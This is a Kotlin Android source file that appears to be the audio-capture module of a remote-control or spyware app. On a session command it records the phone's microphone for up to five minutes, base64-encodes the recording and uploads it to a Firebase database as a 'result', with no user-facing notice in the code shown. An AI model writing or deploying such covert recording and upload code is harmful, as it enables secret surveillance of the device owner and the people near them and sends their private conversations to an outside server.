package com.jonas.x24

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.media.MediaRecorder
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.util.Base64
import android.util.Log
import androidx.core.app.ActivityCompat
import com.google.firebase.database.FirebaseDatabase
import java.io.File

object AudioRecordManager {
    private var recorder: MediaRecorder? = null
    private var outputFile: File? = null
    private val handler = Handler(Looper.getMainLooper())
    private var timeoutRunnable: Runnable? = null
    private var currentSessionKey: String? = null

    private const val MAX_DURATION_MS = 5 * 60 * 1000L // 5 minutes

    fun startRecording(context: Context, sessionKey: String) {
        if (ActivityCompat.checkSelfPermission(context, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            postResult(sessionKey, "ERROR", "Audio permission denied")
            return
        }

        if (recorder != null) {
            postResult(sessionKey, "ERROR", "Already recording")
            return
        }

        currentSessionKey = sessionKey
        outputFile = File.createTempFile("audio_record", ".3gp", context.cacheDir)

        recorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            MediaRecorder(context)
        } else {
            @Suppress("DEPRECATION")
            MediaRecorder()
        }

        try {
            recorder?.setAudioSource(MediaRecorder.AudioSource.MIC)
            recorder?.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
            recorder?.setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
            recorder?.setOutputFile(outputFile?.absolutePath)
            recorder?.prepare()
            recorder?.start()

            // Schedule stop after 5 minutes
            timeoutRunnable = Runnable { stopRecording() }
            handler.postDelayed(timeoutRunnable!!, MAX_DURATION_MS)

            postResult(sessionKey, "TEXT", "Started recording...")
        } catch (e: Exception) {
            postResult(sessionKey, "ERROR", "Recorder error: ${e.message}")
            cleanup()
        }
    }

    fun stopRecording() {
        val sessionKey = currentSessionKey ?: return

        if (recorder == null) {
            postResult(sessionKey, "ERROR", "Not currently recording")
            return
        }

        timeoutRunnable?.let { handler.removeCallbacks(it) }
        timeoutRunnable = null

        try {
            recorder?.stop()
            recorder?.release()

            outputFile?.let {
                val bytes = it.readBytes()
                val base64 = Base64.encodeToString(bytes, Base64.DEFAULT)
                postResult(sessionKey, "AUDIO", base64)
            }
        } catch (e: Exception) {
            postResult(sessionKey, "ERROR", "Failed to stop recording: ${e.message}")
        } finally {
            cleanup()
        }
    }

    private fun cleanup() {
        recorder?.release()
        recorder = null
        outputFile?.delete()
        outputFile = null
        currentSessionKey = null
    }

    private fun postResult(sessionKey: String, type: String, data: String) {
        val ref = FirebaseDatabase.getInstance().reference.child("sessions").child(sessionKey).child("results").push()
        val payload = mapOf(
            "type" to type,
            "data" to data,
            "timestamp" to System.currentTimeMillis()
        )
        ref.setValue(payload)
    }
}
